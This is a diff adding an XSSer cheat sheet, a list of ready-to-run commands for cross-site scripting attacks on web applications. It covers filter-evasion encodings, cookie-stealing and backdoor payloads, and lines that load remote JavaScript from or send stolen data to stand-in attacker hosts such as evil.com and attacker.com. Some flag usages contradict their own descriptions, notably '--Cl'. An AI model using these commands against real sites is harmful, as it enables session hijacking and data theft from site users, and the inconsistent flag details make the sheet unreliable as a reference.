@@ -1,0 +1,157 @@
+# XSSer (Cross Site Scripter)
+
+## Basic Usage
+xsser -u "http://example.com/page.php?param=FUZZ"
+xsser -u "http://example.com/page.php?param=XSS"
+xsser -u "http://example.com/search?q=XSS" --auto
+xsser -u "http://example.com/page.php?id=1&name=XSS"
+xsser -u "http://example.com/page.php?param=XSS" -v
+
+## GET and POST Injection
+xsser -u "http://example.com/page.php?param=XSS" --get
+xsser -u "http://example.com/login" --post "username=XSS&password=test"
+xsser -u "http://example.com/login" --post "username=admin&password=XSS"
+xsser -u "http://example.com/page.php?param=XSS" --cookie "session=abc123"
+xsser -u "http://example.com/page.php?param=XSS" --header "X-Forwarded-For: XSS"
+xsser -u "http://example.com/page.php?param=XSS" --referer "http://evil.com/XSS"
+xsser -u "http://example.com/page.php?param=XSS" --user-agent "XSS"
+
+## Automatic and Batch Scanning
+xsser -u "http://example.com/page.php?param=XSS" --auto
+xsser --url "http://example.com/page.php?param=XSS" --auto
+xsser -i targets.txt --auto
+xsser -i targets.txt -v --auto
+xsser -u "http://example.com/page.php?param=XSS" --auto --reverse-check
+xsser -d "http://example.com/page.php?param=XSS"
+
+## Crawler Mode
+xsser -u "http://example.com" --crawling 2
+xsser -u "http://example.com" --crawling 3 --auto
+xsser -u "http://example.com" --Cw 3
+xsser -u "http://example.com" --Cl "http://example.com"
+xsser -u "http://example.com" --crawling 2 --threads 10
+
+## Payload Injection and Encoding
+xsser -u "http://example.com/page.php?param=XSS" --payload '<script>alert(1)</script>'
+xsser -u "http://example.com/page.php?param=XSS" --auto --Str
+xsser -u "http://example.com/page.php?param=XSS" --auto --Une
+xsser -u "http://example.com/page.php?param=XSS" --auto --Hex
+xsser -u "http://example.com/page.php?param=XSS" --auto --Hes
+xsser -u "http://example.com/page.php?param=XSS" --auto --Dwo
+xsser -u "http://example.com/page.php?param=XSS" --auto --Doo
+xsser -u "http://example.com/page.php?param=XSS" --auto --B64
+xsser -u "http://example.com/page.php?param=XSS" --auto --Cem "UTF-8"
+
+## Filter Bypass and Evasion Techniques
+xsser -u "http://example.com/page.php?param=XSS" --Fp "<script>alert(1)</script>"
+xsser -u "http://example.com/page.php?param=XSS" --Fr "<script>alert(1)</script>"
+xsser -u "http://example.com/page.php?param=XSS" --auto --Str --Une
+xsser -u "http://example.com/page.php?param=XSS" --auto --Hex --Hes
+xsser -u "http://example.com/page.php?param=XSS" --Jk "http://evil.com/xss.js"
+xsser -u "http://example.com/page.php?param=XSS" --auto --Dwo --Doo
+xsser -u "http://example.com/page.php?param=XSS" --auto --Abs
+xsser -u "http://example.com/page.php?param=XSS" --auto --Esc
+
+## DOM and Blind XSS
+xsser -u "http://example.com/page.php?param=XSS" --Dom
+xsser -u "http://example.com/page.php?param=XSS" --Dom --auto
+xsser -u "http://example.com/page.php?param=XSS" --Cp "http://attacker.com/collect.php"
+xsser -u "http://example.com/page.php?param=XSS" --Cl "http://attacker.com/logger.php"
+
+## Cookie and Session Stealing
+xsser -u "http://example.com/page.php?param=XSS" --Coo
+xsser -u "http://example.com/page.php?param=XSS" --Dos
+xsser -u "http://example.com/page.php?param=XSS" --Onm
+xsser -u "http://example.com/page.php?param=XSS" --Ifr
+
+## Exploitation and Injection Finalization
+xsser -u "http://example.com/page.php?param=XSS" --Fp "<script>alert('XSS')</script>"
+xsser -u "http://example.com/page.php?param=XSS" --Fr "<img src=x onerror=alert(1)>"
+xsser -u "http://example.com/page.php?param=XSS" --Jk "http://attacker.com/hook.js"
+xsser -u "http://example.com/page.php?param=XSS" --Onm
+xsser -u "http://example.com/page.php?param=XSS" --Ifr
+xsser -u "http://example.com/page.php?param=XSS" --XSA
+xsser -u "http://example.com/page.php?param=XSS" --XSB
+
+## Authentication and Proxy
+xsser -u "http://example.com/page.php?param=XSS" --cookie "PHPSESSID=abc123def456"
+xsser -u "http://example.com/page.php?param=XSS" --proxy "http://127.0.0.1:8080"
+xsser -u "http://example.com/page.php?param=XSS" --proxy "socks5://127.0.0.1:1080"
+xsser -u "http://example.com/page.php?param=XSS" --auth-type Basic --auth-cred "admin:password"
+xsser -u "http://example.com/page.php?param=XSS" --ignore-proxy
+xsser -u "http://example.com/page.php?param=XSS" --user-agent "Mozilla/5.0 (Windows NT 10.0)"
+
+## Threads and Connection Tuning
+xsser -u "http://example.com/page.php?param=XSS" --threads 10
+xsser -u "http://example.com/page.php?param=XSS" --timeout 30
+xsser -u "http://example.com/page.php?param=XSS" --retries 3
+xsser -u "http://example.com/page.php?param=XSS" --delay 2
+xsser -u "http://example.com/page.php?param=XSS" --threads 20 --timeout 15 --auto
+
+## Output and Reporting
+xsser -u "http://example.com/page.php?param=XSS" --auto -v
+xsser -u "http://example.com/page.php?param=XSS" --auto --xml "output.xml"
+xsser -u "http://example.com/page.php?param=XSS" --auto --short
+xsser -u "http://example.com/page.php?param=XSS" --auto --large
+xsser -u "http://example.com/page.php?param=XSS" --save
+xsser -u "http://example.com/page.php?param=XSS" --auto --statistics
+
+## Combined Full Attack One-Liners
+xsser -u "http://example.com/page.php?param=XSS" --auto --Str --Une --Hex -v
+xsser -u "http://example.com/page.php?param=XSS" --auto --proxy "http://127.0.0.1:8080" --cookie "session=abc123" --threads 10
+xsser -u "http://example.com/login" --post "user=XSS&pass=test" --auto --Hex --Une -v
+xsser -u "http://example.com/page.php?param=XSS" --auto --Dom --Coo --reverse-check -v
+xsser -i targets.txt --auto --threads 15 --xml results.xml -v
+xsser -u "http://example.com/page.php?param=XSS" --auto --B64 --Dwo --Fp "<script>alert(document.cookie)</script>" --Coo
+
+## Common Flags
+- `-u` - Target URL; place `XSS` keyword where injection should be tested
+- `--auto` - Automatically inject all built-in XSS payloads against the target parameter
+- `--get` - Send injection via GET request method (default behavior)
+- `--post` - Send injection via POST request with specified body data
+- `-i` - Read target URLs from a file; one URL per line with `XSS` keyword
+- `-d` - Direct injection mode; inject directly into the provided URL
+- `--crawling` - Enable spidering to discover and test injectable parameters; set depth level
+- `--Cw` - Set the crawling width (number of pages to spider at each depth level)
+- `--Cl` - Restrict crawling to links within the specified domain scope
+- `--threads` - Number of concurrent scanning threads (default: 1)
+- `--timeout` - HTTP request timeout in seconds
+- `--retries` - Number of times to retry a failed request
+- `--delay` - Delay in seconds between each request to reduce detection likelihood
+- `--proxy` - Route all traffic through a proxy (supports HTTP and SOCKS5)
+- `--ignore-proxy` - Ignore system proxy settings entirely
+- `--cookie` - Inject custom cookie header with each request for authenticated scanning
+- `--header` - Inject a custom HTTP header; supports `XSS` keyword for header-based injection
+- `--user-agent` - Set a custom User-Agent string; supports `XSS` for UA-based injection
+- `--referer` - Set a custom Referer header; supports `XSS` for referer-based injection
+- `--auth-type` - HTTP authentication type (Basic, Digest, NTLM)
+- `--auth-cred` - HTTP authentication credentials in `user:password` format
+- `--payload` - Inject a single specific custom XSS payload instead of the built-in list
+- `--Fp` - Final payload to execute upon confirmed XSS vulnerability (e.g. cookie stealer)
+- `--Fr` - Final payload using a raw injection string upon confirmed vulnerability
+- `--Jk` - Hijack page via a remote JavaScript file injected on confirmed XSS
+- `--Str` - Apply string encoding to payloads to bypass basic input filters
+- `--Une` - Apply URL encoding to payloads
+- `--Hex` - Apply hexadecimal encoding to payloads
+- `--Hes` - Apply HTML entity encoding to payloads
+- `--B64` - Apply Base64 encoding to payloads
+- `--Dwo` - Encode payloads using double word obfuscation
+- `--Doo` - Encode payloads using double obfuscation technique
+- `--Cem` - Set a custom character encoding method (e.g. UTF-8, UTF-16)
+- `--Abs` - Use absolute URI obfuscation in payloads to evade filters
+- `--Esc` - Apply escape character obfuscation to payloads
+- `--Dom` - Enable DOM-based XSS detection and injection testing
+- `--Coo` - Inject payloads designed to steal session cookies from the victim
+- `--Onm` - Use `onMouseMove` event handler as the XSS injection vector
+- `--Ifr` - Inject an invisible `<iframe>` as the XSS exploitation vector
+- `--Dos` - Inject a Denial of Service payload against the vulnerable parameter
+- `--XSA` - Inject Cross-Site Agent payload via the User-Agent header automatically
+- `--XSB` - Inject Cross-Site Backdoor payload into the target application
+- `--Cp` - Specify a remote URL to receive stolen data via cross-site polling
+- `--reverse-check` - Verify confirmed XSS injections by making a reverse connection callback
+- `--xml` - Save full scan results to an XML report file at the specified path
+- `--save` - Save discovered vulnerable URLs to a local file for later use
+- `--statistics` - Display a detailed statistics summary at the end of the scan
+- `--short` - Display a shortened, minimal results output
+- `--large` - Display extended verbose output for all tested payloads
+- `-v` - Enable verbose mode to show detailed request and response information
